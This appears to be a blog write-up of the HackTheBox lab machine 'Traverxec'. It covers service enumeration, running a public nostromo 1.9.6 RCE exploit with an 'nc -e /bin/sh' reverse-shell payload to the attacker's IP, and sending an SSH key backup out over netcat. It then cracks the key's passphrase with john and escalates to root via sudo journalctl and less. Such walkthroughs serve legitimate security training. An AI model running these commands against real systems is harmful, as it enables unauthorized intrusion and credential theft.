---
layout: post
title:  Traverxec
categories: hackthebox
tags: [hackthebox, linux, easy, nostromo, gtfobins]
---

![Traverxec](../../../../assets/images/hackthebox/traverxec/traverxec.jpg)

## abstract

Traverxec is an easy box made by [@jkr](https://twitter.com/ATeamJKR). It contains a nhttpd webserver also known as nostromo. 
The privesc from low privilege shell to user shell is an easy cracking challenge for john and for the privesc to root we need
some knowledge from gtfobins about _journalctl_ and _less_.

## enumeration

### nmap
The first step is to enumerate all open ports and determine the running services that are reachable from outside.
If we enumerate over all ports in verbose mode it took several minutes to get the result. So at first we should make 
quick scan and take all open ports to scan the service behind them.

```bash
Nmap scan report for 10.10.10.165
Host is up (0.029s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c (RSA)
|   256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA)
|_  256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519)
80/tcp open  http    nostromo 1.9.6
|_http-server-header: nostromo 1.9.6
|_http-title: TRAVERXEC
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.39 seconds
```

As the scan result we have an open ssh port and on port 80 is a http server running called nostromo in version 1.9.6.

### website
If we take a look on the website we may find something interesting. 
![website](../../../../assets/images/hackthebox/traverxec/website.jpg)

The first interesting thing could be the name **David White**. Maybe gobuster find something valuable.

```bash
kali@kali:~$ gobuster dir -u http://10.10.10.165 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x .html | tee traverxec_gobuster.txt
```

Short answer: no.

I didn't know a web server called nostromo before. So the next obvious thing is to take some research for nostromo and a possible vulnerability for version 1.9.6.

Before I use google or something I use _searchsploit_ directly from shell, maybe the exploitdb know something.

```bash
Nostromo - Directory Traversal Remote Command Execution (Metasploit)    | exploits/multiple/remote/47573.rb
nostromo 1.9.6 - Remote Code Execution                                  | exploits/multiple/remote/47837.py
nostromo nhttpd 1.9.3 - Directory Traversal Remote Command Execution    | exploits/linux/remote/35466.sh
```

What a lucky coincidence, nostromo in version 1.9.6 is vulnerable to a remote code execution. [exploitdb](https://www.exploit-db.com/exploits/47837)

## exploitation

The exploitation seems to be easy with the found python script. So let's create a reverse shell.

On the attacker machine:

```bash
nc -nlvp 1337
```

Send payload:
```bash
kali@kali:~$ python 47837.py 10.10.10.165 80 'nc -e /bin/sh 10.10.14.37 1337'
```

Aaaaaand BINGO, to have a more convenient low priv shell, we should use python on the victim machine:
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
www-data@traverxec:/usr/bin$
```

## userflag

Now we are on the victim machine. So let's take a look for valuable things. 

```bash
www-data@traverxec:/$ ls -l /home
ls -l /home
total 4
drwx--x--x 5 david david 4096 Apr 12 06:13 david 
```

The executive flag is set for others, very strange. 
Let's take a look further.

```bash
www-data@traverxec:/var/nostromo/conf$ cat nhttpd.conf
cat nhttpd.conf
# MAIN [MANDATORY]

servername              traverxec.htb
serverlisten            *
serveradmin             david@traverxec.htb
serverroot              /var/nostromo
servermimes             conf/mimes
docroot                 /var/nostromo/htdocs
docindex                index.html

# LOGS [OPTIONAL]

logpid                  logs/nhttpd.pid

# SETUID [RECOMMENDED]

user                    www-data

# BASIC AUTHENTICATION [OPTIONAL]

htaccess                .htaccess
htpasswd                /var/nostromo/conf/.htpasswd

# ALIASES [OPTIONAL]

/icons                  /var/nostromo/icons

# HOMEDIRS [OPTIONAL]

homedirs                /home
homedirs_public         public_www
```

Nothing very useful on the first look. But let's read something about nostromo. If we are the user www-data and we are running this nostromo server. We need to have access to those homedirs.
Maybe let's try to access these in a kind of blind mode.

```bash
www-data@traverxec:/var/nostromo/conf$ ls -l /home/david/public_www
ls -l /home/david/public_www
total 8
-rw-r--r-- 1 david david  402 Oct 25 15:45 index.html
drwxr-xr-x 2 david david 4096 Oct 25 17:02 protected-file-area
www-data@traverxec:/var/nostromo/conf$ ls -l /home/david/public_www/protected-file-area 
total 4
-rw-r--r-- 1 david david 1915 Oct 25 17:02 backup-ssh-identity-files.tgz
```

It seems to work. So let's download these backup files.

```bash
On attacker machine:
kali@kali:~$ nc -l -p 1234 -q 1 > backup-ssh-identity-files.tgz < /dev/null

On victim machine:
nc 10.10.14.37 1234 < /home/david/public_www/protected-file-area/backup-ssh-identity-files.tgz
```

Now extract and we have access to an encrypted ssh private key from david (/path/to/folder/home/david/.ssh/id_rsa).

The next step is to try john to crack this thing, but first it have to be converted in the right format.

```bash
# Convert ssh private key to john compatible hash
kali@kali:~$ python3 /usr/share/john/ssh2john id_rsa > key.hash

# attack the hash
kali@kali:~$ john --format=SSH -w /usr/share/wordlists/rockyou.txt

Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
hunter           (id_rsa)
1g 0:00:00:00 DONE (2020-04-12 10:25) 20.00g/s 70920p/s 70920c/s 70920C/s paagal..sss
Session completed

kali@kali:~$ john --show key.hash
id_rsa:hunter

1 password hash cracked, 0 left
```

Now we can login as david@traverxec.htb and take the user.txt.

```bash
kali@kali:~$ ssh -i ./home/david/.ssh/id_rsa david@traverxec.htb
The authenticity of host 'traverxec.htb (traverxec.htb)' can't be established.
ECDSA key fingerprint is SHA256:CiO/pUMzd+6bHnEhA2rAU30QQiNdWOtkEPtJoXnWzVo.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'traverxec.htb' (ECDSA) to the list of known hosts.
Enter passphrase for key 'id_rsa': 
Linux traverxec 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64
Last login: Sun Apr 12 07:21:40 2020 from 10.10.14.21
david@traverxec:~$ ls
bin  public_www  user.txt
david@traverxec:~$ wc user.txt 
 1  1 33 user.txt
```

## privilege escalation

At this point we have a valid ssh login to david@traverxec.htb. So let's find the privesc and root this machine.

```bash
david@traverxec:~$ ls
bin  public_www  user.txt
david@traverxec:~$ cd bin
david@traverxec:~/bin$ ls
new  server-stats.head  server-stats.sh
david@traverxec:~/bin$ cat server-stats.sh 
#!/bin/bash

cat /home/david/bin/server-stats.head
echo "Load: `/usr/bin/uptime`"
echo " "
echo "Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`"
echo "Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`"
echo " "
echo "Last 5 journal log lines:"
/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat
```

It seems to be that david can gain root privileges if he use journalctl. So let's have a look at [gtfobins](https://gtfobins.github.io/gtfobins/journalctl/).

_Journalctl_ uses _less_ as default and this can be used to create a shell with higher permissions.

```bash
david@traverxec:~/bin$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service 
!/bin/bash
root@traverxec:/home/david/bin#
root@traverxec: wc /root/root.txt 
 1  1 33 user.txt
```

And that's it, system owned.